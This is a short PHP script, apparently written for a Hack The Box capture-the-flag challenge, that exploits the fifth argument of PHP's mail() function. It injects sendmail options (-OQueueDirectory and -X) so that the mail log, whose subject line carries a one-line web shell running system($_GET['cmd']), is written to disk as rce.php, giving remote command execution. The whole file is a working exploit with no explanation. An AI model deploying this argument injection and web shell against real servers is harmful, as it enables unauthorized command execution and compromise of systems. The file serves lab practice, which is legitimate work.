<?php 
  $to = 'a@b.c';
  $subject = '<?php system($_GET["cmd"]); ?>';
  $message = '';
  $headers = '';
  $options = '-OQueueDirectory=/tmp -X/home/diegojoel301/htb_challengues/letter-dispair/rce.php';
  mail($to, $subject, $message, $headers, $options);
?>
